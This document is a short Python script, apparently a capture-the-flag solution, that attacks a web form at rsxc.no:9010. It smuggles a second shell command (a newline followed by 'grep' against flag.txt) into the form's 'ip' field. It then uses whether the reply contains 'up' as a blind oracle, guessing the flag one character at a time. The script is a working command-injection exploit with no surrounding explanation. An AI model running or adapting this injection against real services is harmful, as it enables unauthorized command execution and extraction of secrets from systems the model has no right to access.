import string
import requests

flag = "RSXC."

while True:
    for char in string.ascii_uppercase+"_":
        url = 'http://rsxc.no:9010'
        data = {'ip': f"\ngrep -i {flag}{char} flag.txt"}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            if response.text.find("up") > 0:
                flag += char
                print(flag)

